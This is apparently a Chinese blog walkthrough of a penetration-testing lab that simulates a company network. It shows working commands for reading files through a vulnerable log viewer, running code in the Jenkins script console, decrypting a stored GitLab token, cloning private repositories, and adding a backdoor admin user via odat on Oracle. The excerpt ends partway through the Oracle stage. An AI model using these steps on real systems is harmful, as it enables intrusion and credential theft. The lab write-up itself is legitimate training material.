<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="ta0"><meta name="copyright" content="ta0"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>春秋云境-Privilege | ta0的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/png" href="/myfa.ico"><link rel="mask-icon" href="/myfa.ico" color="#0078E7"><link rel="preload" href="/css/mycss.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"ta0.fun","root":"/","title":"做点小小记录","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/mycss.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="ta0的小站" type="application/atom+xml"><meta name="description" content="靶标介绍在这个靶场中，您将扮演一名资深黑客，被雇佣来评估虚构公司 XR Shop 的网络安全。您需要通过渗透测试逐个击破公司暴露在公网的应用，并通过后渗透技巧深入 XR Shop 的内部网络，寻找潜在的弱点和漏洞，并通过滥用 Windows 特权获取管理员权限，最终并获取隐藏在其内部的核心机密。该靶场共有 4 个 Flag，分布于不同的靶机。  第1关 请获取 XR Shop 官网源码的备份文件，">
<meta property="og:type" content="article">
<meta property="og:title" content="春秋云境-Privilege">
<meta property="og:url" content="http://ta0.fun/posts/cb0f9c73/index.html">
<meta property="og:site_name" content="ta0的小站">
<meta property="og:description" content="靶标介绍在这个靶场中，您将扮演一名资深黑客，被雇佣来评估虚构公司 XR Shop 的网络安全。您需要通过渗透测试逐个击破公司暴露在公网的应用，并通过后渗透技巧深入 XR Shop 的内部网络，寻找潜在的弱点和漏洞，并通过滥用 Windows 特权获取管理员权限，最终并获取隐藏在其内部的核心机密。该靶场共有 4 个 Flag，分布于不同的靶机。  第1关 请获取 XR Shop 官网源码的备份文件，">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s1.imagehub.cc/images/2025/02/15/c6f14b97b96362a2ac5d08b0a25fc797.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2025/02/15/9435d9b254760a69670576dc7ee28ef5.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2025/02/15/4460dff828f17633f8fe0213466b9bbe.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2025/02/15/888a2d52aa6adf206f5e76fbfbf39f16.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2025/02/15/1a0135a96514fc384df2389b7a1b6e14.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2025/02/15/ae67763051acc65cd35eadf800bb4556.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2025/02/15/33ba5c7bfccffb8aa1f04153ac1ccacd.png">
<meta property="article:published_time" content="2025-02-15T05:32:30.688Z">
<meta property="article:modified_time" content="2025-02-18T12:40:33.962Z">
<meta property="article:author" content="ta0">
<meta property="article:tag" content="jenkins">
<meta property="article:tag" content="oracle">
<meta property="article:tag" content="SeRestorePrivilege">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s1.imagehub.cc/images/2025/02/15/c6f14b97b96362a2ac5d08b0a25fc797.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="ta0"><img width="96" loading="lazy" src="/123.jpg" alt="ta0"></a><div class="site-author-name"><a href="/about/">ta0</a></div><span class="site-name">ta0的小站</span><sub class="site-subtitle">网安小白的成长记录</sub><div class="site-description">Learning For Fun</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">132</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">18</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">204</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/tao0845" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=312924699" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:2814928906@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E6%A0%87%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">靶标介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jenkins"><span class="toc-number">2.</span> <span class="toc-text">jenkins</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gitlab-oracle"><span class="toc-number">3.</span> <span class="toc-text">gitlab&#x2F;oracle</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SeRestorePrivilege%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">SeRestorePrivilege提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%B7%E5%BD%B1%E6%8B%B7%E8%B4%9D"><span class="toc-number">5.</span> <span class="toc-text">卷影拷贝</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://ta0.fun/posts/cb0f9c73/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ta0"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="ta0的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">春秋云境-Privilege</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2025-02-15 13:32:30" itemprop="dateCreated datePublished" datetime="2025-02-15T13:32:30+08:00">2025-02-15</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2025-02-18 20:40:33" itemprop="dateModified" datetime="2025-02-18T20:40:33+08:00">2025-02-18</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">2.9k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">15m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E6%B8%97%E9%80%8F/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">渗透</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/jenkins/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">jenkins</span></a><a class="tag-item" href="/tags/oracle/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">oracle</span></a><a class="tag-item" href="/tags/SeRestorePrivilege/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">SeRestorePrivilege</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h2 id="靶标介绍"><a href="#靶标介绍" class="headerlink" title="靶标介绍"></a>靶标介绍</h2><p>在这个靶场中，您将扮演一名资深黑客，被雇佣来评估虚构公司 XR Shop 的网络安全。您需要通过渗透测试逐个击破公司暴露在公网的应用，并通过后渗透技巧深入 XR Shop 的内部网络，寻找潜在的弱点和漏洞，并通过滥用 Windows 特权获取管理员权限，最终并获取隐藏在其内部的核心机密。该靶场共有 4 个 Flag，分布于不同的靶机。</p>
<blockquote>
<p>第1关 请获取 XR Shop 官网源码的备份文件，并尝试获得系统上任意文件读取的能力。并且，管理员在配置 Jenkins 时，仍然选择了使用初始管理员密码，请尝试读取该密码并获取 Jenkins 服务器权限。Jenkins 配置目录为 C:\ProgramData\Jenkins.jenkins。</p>
</blockquote>
<blockquote>
<p>第2关 管理员为 Jenkins 配置了 Gitlab，请尝试获取 Gitlab API Token，并最终获取 Gitlab 中的敏感仓库。获取敏感信息后，尝试连接至 Oracle 数据库，并获取 ORACLE 服务器控制权限。</p>
</blockquote>
<blockquote>
<p>第3关 攻击办公区内网，获取办公 PC 控制权限，并通过特权滥用提升至 SYSTEM 权限。</p>
</blockquote>
<blockquote>
<p>第4关 尝试接管备份管理操作员帐户，并通过转储 NTDS 获得域管理员权限，最终控制整个域环境。</p>
</blockquote>
<h2 id="jenkins"><a href="#jenkins" class="headerlink" title="jenkins"></a>jenkins</h2><p><img src="https://s1.imagehub.cc/images/2025/02/15/c6f14b97b96362a2ac5d08b0a25fc797.png" alt="image" loading="lazy"><br>wordpress,浅扫一下目录发现泄露了<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$logfile</span> <span class="token operator">=</span> <span class="token function">rawurldecode</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'logfile'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// Make sure the file is exist.</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">file_exists</span><span class="token punctuation">(</span> <span class="token variable">$logfile</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// Get the content and echo it.</span>
  <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span> <span class="token variable">$logfile</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">echo</span><span class="token punctuation">(</span> <span class="token variable">$text</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">exit</span><span class="token punctuation">;</span></span></code></pre>
<p><code>content-log.php</code>可以LFI,尝试读取管理员密码,配置目录<code>C:\ProgramData\Jenkins\.jenkins</code>,搜索得知管理员密码存放目录在&#x2F;jenkins&#x2F;secrets&#x2F;initialAdminPassword<br><img src="https://s1.imagehub.cc/images/2025/02/15/9435d9b254760a69670576dc7ee28ef5.png" alt="image" loading="lazy"><br>拿到管理员密码<code>510235cf43f14e83b88a9f144199655b</code>，不是md5而是明文<br>8080端口进入jenkins后台，进入脚本控制台rce</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">println <span class="token string">"whoami"</span>.execute<span class="token punctuation">(</span><span class="token punctuation">)</span>.text</code></pre>
<p><img src="https://s1.imagehub.cc/images/2025/02/15/4460dff828f17633f8fe0213466b9bbe.png" alt="image" loading="lazy"><br>直接创建后门用户然后rdp拿到flag1</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">                                 _         _       _   _                 
                                <span class="token operator">|</span> <span class="token operator">|</span>       <span class="token operator">|</span> <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span>                
  ___ ___  _ __   __ _ _ __ __ _<span class="token operator">|</span> <span class="token operator">|</span>_ _   _<span class="token operator">|</span> <span class="token operator">|</span> __ _<span class="token operator">|</span> <span class="token operator">|</span>_ _  ___  _ __  ___ 
 / __/ _ <span class="token punctuation">\</span><span class="token operator">|</span> <span class="token string">'_ \ / _` | '</span>__/ _<span class="token variable"><span class="token variable">`</span> <span class="token operator">|</span> __<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>/ _<span class="token variable">`</span></span> <span class="token operator">|</span> __<span class="token operator">|</span> <span class="token operator">|</span>/ _ <span class="token punctuation">\</span><span class="token operator">|</span> '_ <span class="token punctuation">\</span>/ __<span class="token operator">|</span>
<span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">\</span>__ <span class="token punctuation">\</span>
 <span class="token punctuation">\</span>___<span class="token punctuation">\</span>___/<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>__, <span class="token operator">|</span>_<span class="token operator">|</span>  <span class="token punctuation">\</span>__,_<span class="token operator">|</span><span class="token punctuation">\</span>__<span class="token operator">|</span><span class="token punctuation">\</span>__,_<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>__,_<span class="token operator">|</span><span class="token punctuation">\</span>__<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>___/<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>___/
                  __/ <span class="token operator">|</span>                                                  
                 <span class="token operator">|</span>___/                                                   


flag01: flag<span class="token punctuation">&#123;</span>728b21ee-fb7c-4837-a33d-39a2d95d7161<span class="token punctuation">&#125;</span>
</code></pre>
<h2 id="gitlab-oracle"><a href="#gitlab-oracle" class="headerlink" title="gitlab&#x2F;oracle"></a>gitlab&#x2F;oracle</h2><p>根据要求需要获取gitlab API Token,先扫一下内网看看gitlab在哪个机器上</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">172.22</span>.14.7  jenkins
<span class="token number">172.22</span>.14.11 DC
<span class="token number">172.22</span>.14.16 GitLab
<span class="token number">172.22</span>.14.31 ORACLE
<span class="token number">172.22</span>.14.46 机器用户 XIAORANG<span class="token punctuation">\</span>XR-0923</code></pre>
<p>确定gitlab在16这台机器<br><img src="https://s1.imagehub.cc/images/2025/02/15/888a2d52aa6adf206f5e76fbfbf39f16.png" alt="image" loading="lazy"><br>在<code>C:\ProgramData\Jenkins\.jenkins\credentials.xml</code>可以得到gitlab apitoken<br><img src="https://s1.imagehub.cc/images/2025/02/15/1a0135a96514fc384df2389b7a1b6e14.png" alt="image" loading="lazy"><br>&#96;&#96;xml<br><?xml version='1.1' encoding='UTF-8'?><br>&lt;com.cloudbees.plugins.credentials.SystemCredentialsProvider plugin&#x3D;”<a href="mailto:&#99;&#114;&#x65;&#100;&#x65;&#x6e;&#x74;&#x69;&#97;&#108;&#x73;&#64;&#49;&#x32;&#49;&#x34;&#x2e;&#x76;&#x31;&#100;&#x65;&#57;&#x34;&#x30;&#x31;&#48;&#51;&#57;&#50;&#55;">&#99;&#114;&#x65;&#100;&#x65;&#x6e;&#x74;&#x69;&#97;&#108;&#x73;&#64;&#49;&#x32;&#49;&#x34;&#x2e;&#x76;&#x31;&#100;&#x65;&#57;&#x34;&#x30;&#x31;&#48;&#51;&#57;&#50;&#55;</a>“&gt;<br>  <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash"><br>    <entry><br>      &lt;com.cloudbees.plugins.credentials.domains.Domain&gt;<br>        <specifications/><br>      &lt;&#x2F;com.cloudbees.plugins.credentials.domains.Domain&gt;<br>      &lt;java.util.concurrent.CopyOnWriteArrayList&gt;<br>        &lt;com.dabsquared.gitlabjenkins.connection.GitLabApiTokenImpl plugin&#x3D;”<a href="mailto:&#103;&#x69;&#x74;&#x6c;&#x61;&#98;&#45;&#x70;&#x6c;&#x75;&#x67;&#105;&#110;&#x40;&#x31;&#46;&#54;&#x2e;&#x30;">&#103;&#x69;&#x74;&#x6c;&#x61;&#98;&#45;&#x70;&#x6c;&#x75;&#x67;&#105;&#110;&#x40;&#x31;&#46;&#54;&#x2e;&#x30;</a>“&gt;<br>          <scope>GLOBAL</scope><br>          <id>9eca4a05-e058-4810-b952-bd6443e6d9a8</id><br>          <description></description><br>          <apiToken>{AQAAABAAAAAg9+7GBocqYmo0y3H+uDK9iPsvst95F5i3QO3zafrm2TC5U24QCq0zm&#x2F;GEobmrmLYh}</apiToken><br>        &lt;&#x2F;com.dabsquared.gitlabjenkins.connection.GitLabApiTokenImpl&gt;<br>      &lt;&#x2F;java.util.concurrent.CopyOnWriteArrayList&gt;<br>    </entry><br>  </domainCredentialsMap><br>&lt;&#x2F;com.cloudbees.plugins.credentials.SystemCredentialsProvider&gt;</p>
<pre class="language-none"><code class="language-none">
&#96;&#96;&#96;bash
println(hudson.util.Secret.fromString(&quot;&#123;AQAAABAAAAAg9+7GBocqYmo0y3H+uDK9iPsvst95F5i3QO3zafrm2TC5U24QCq0zm&#x2F;GEobmrmLYh&#125;&quot;).getPlainText())</code></pre>
<p>jenkins控制解密得到密钥<code>glpat-7kD_qLH2PiQv_ywB9hz2</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  proxychains4 <span class="token parameter variable">-q</span> <span class="token function">curl</span> <span class="token parameter variable">--header</span> <span class="token string">"PRIVATE-TOKEN:glpat-7kD_qLH2PiQv_ywB9hz2"</span> <span class="token string">"http://172.22.14.16/api/v4/projects"</span> <span class="token operator">|</span> jq  
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
<span class="token number">100</span> <span class="token number">19189</span>    <span class="token number">0</span> <span class="token number">19189</span>    <span class="token number">0</span>     <span class="token number">0</span>   <span class="token number">6077</span>      <span class="token number">0</span> --:--:--  <span class="token number">0</span>:00:03 --:--:--  <span class="token number">6078</span>
<span class="token punctuation">[</span>
  <span class="token punctuation">&#123;</span>
    <span class="token string">"id"</span><span class="token builtin class-name">:</span> <span class="token number">6</span>,
    <span class="token string">"description"</span><span class="token builtin class-name">:</span> null,
    <span class="token string">"name"</span><span class="token builtin class-name">:</span> <span class="token string">"Internal Secret"</span>,
    <span class="token string">"name_with_namespace"</span><span class="token builtin class-name">:</span> <span class="token string">"XRLAB / Internal Secret"</span>,
    <span class="token string">"path"</span><span class="token builtin class-name">:</span> <span class="token string">"internal-secret"</span>,
    <span class="token string">"path_with_namespace"</span><span class="token builtin class-name">:</span> <span class="token string">"xrlab/internal-secret"</span>,
    <span class="token string">"created_at"</span><span class="token builtin class-name">:</span> <span class="token string">"2022-12-25T08:30:12.362Z"</span>,
    <span class="token string">"default_branch"</span><span class="token builtin class-name">:</span> <span class="token string">"main"</span>,
    <span class="token string">"tag_list"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>,
    <span class="token string">"topics"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>,
    <span class="token string">"ssh_url_to_repo"</span><span class="token builtin class-name">:</span> <span class="token string">"git@gitlab.xiaorang.lab:xrlab/internal-secret.git"</span>,
    <span class="token string">"http_url_to_repo"</span><span class="token builtin class-name">:</span> <span class="token string">"http://gitlab.xiaorang.lab/xrlab/internal-secret.git"</span>,
    <span class="token string">"web_url"</span><span class="token builtin class-name">:</span> <span class="token string">"http://gitlab.xiaorang.lab/xrlab/internal-secret"</span>,
    <span class="token string">"readme_url"</span><span class="token builtin class-name">:</span> null,
    <span class="token string">"avatar_url"</span><span class="token builtin class-name">:</span> null,
    <span class="token string">"forks_count"</span><span class="token builtin class-name">:</span> <span class="token number">0</span>,
    <span class="token string">"star_count"</span><span class="token builtin class-name">:</span> <span class="token number">0</span>,
    <span class="token string">"last_activity_at"</span><span class="token builtin class-name">:</span> <span class="token string">"2022-12-25T08:30:12.362Z"</span>,
<span class="token punctuation">..</span>.
<span class="token punctuation">..</span>.</code></pre>
<p>把仓库都dump下来</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">proxychains4 <span class="token parameter variable">-q</span> <span class="token function">git</span> clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/internal-secret.git
proxychains4 <span class="token parameter variable">-q</span> <span class="token function">git</span> clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/xradmin.git
proxychains4 <span class="token parameter variable">-q</span> <span class="token function">git</span> clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/xrwiki.git
proxychains4 <span class="token parameter variable">-q</span> <span class="token function">git</span> clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/awenode.git</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp/pri<span class="token punctuation">]</span> ➜  <span class="token function">ls</span> <span class="token parameter variable">-al</span>                                                                          <span class="token punctuation">[</span><span class="token number">14</span>:34:23<span class="token punctuation">]</span>
total <span class="token number">0</span>
drwxr-xr-x  <span class="token number">6</span> root root <span class="token number">120</span> Feb <span class="token number">15</span> <span class="token number">14</span>:34 <span class="token builtin class-name">.</span>
drwxrwxrwt <span class="token number">27</span> root root <span class="token number">880</span> Feb <span class="token number">15</span> <span class="token number">14</span>:33 <span class="token punctuation">..</span>
drwxr-xr-x  <span class="token number">8</span> root root <span class="token number">320</span> Feb <span class="token number">15</span> <span class="token number">14</span>:34 awenode
drwxr-xr-x  <span class="token number">3</span> root root  <span class="token number">80</span> Feb <span class="token number">15</span> <span class="token number">14</span>:33 internal-secret
drwxr-xr-x <span class="token number">12</span> root root <span class="token number">340</span> Feb <span class="token number">15</span> <span class="token number">14</span>:34 xradmin
drwxr-xr-x  <span class="token number">3</span> root root <span class="token number">140</span> Feb <span class="token number">15</span> <span class="token number">14</span>:34 xrwiki</code></pre>
<p><img src="https://s1.imagehub.cc/images/2025/02/15/ae67763051acc65cd35eadf800bb4556.png" alt="image" loading="lazy"><br>找到oracle 密码 <code>xradmin:fcMyE8t9E4XdsKf</code><br>MDUT连不上，使用<code>odat</code>以dba用户执行命令</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp/pri<span class="token punctuation">]</span> ➜  proxychains4 <span class="token parameter variable">-q</span> odat dbmsscheduler <span class="token parameter variable">-s</span> <span class="token number">172.22</span>.14.31 <span class="token parameter variable">-p</span> <span class="token number">1521</span> <span class="token parameter variable">-d</span> ORCL <span class="token parameter variable">-U</span> xradmin <span class="token parameter variable">-P</span> fcMyE8t9E4XdsKf <span class="token parameter variable">--sysdba</span> <span class="token parameter variable">--exec</span> <span class="token string">'net user tao0845 123456qwe. /add'</span>

<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">172.22</span>.14.31:1521<span class="token punctuation">)</span>: Execute the <span class="token variable"><span class="token variable">`</span>net user tao0845 123456qwe. /add<span class="token variable">`</span></span> on the <span class="token number">172.22</span>.14.31 server
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> The <span class="token variable"><span class="token variable">`</span>net user tao0845 123456qwe. /add<span class="token variable">`</span></span> <span class="token builtin class-name">command</span> was executed on the <span class="token number">172.22</span>.14.31 server
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> The Job is finish
root@kali2 <span class="token punctuation">[</span>/tmp/pri<span class="token punctuation">]</span> ➜  proxychains4 <span class="token parameter variable">-q</span> odat dbmsscheduler <span class="token parameter variable">-s</span> <span class="token number">172.22</span>.14.31 <span class="token parameter variable">-p</span> <span class="token number">1521</span> <span class="token parameter variable">-d</span> ORCL <span class="token parameter variable">-U</span> xradmin <span class="token parameter variable">-P</span> fcMyE8t9E4XdsKf <span class="token parameter variable">--sysdba</span> <span class="token parameter variable">--exec</span> <span class="token string">'net localgroup administrators tao0845 /add'</span>

<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">172.22</span>.14.31:1521<span class="token punctuation">)</span>: Execute the <span class="token variable"><span class="token variable">`</span>net localgroup administrators tao0845 /add<span class="token variable">`</span></span> on the <span class="token number">172.22</span>.14.31 server
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> The <span class="token variable"><span class="token variable">`</span>net localgroup administrators tao0845 /add<span class="token variable">`</span></span> <span class="token builtin class-name">command</span> was executed on the <span class="token number">172.22</span>.14.31 server
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> The Job is finish</code></pre>
<p>RDP拿到flag</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">   __ _                      _               <span class="token punctuation">(</span>_<span class="token punctuation">)</span>           _      
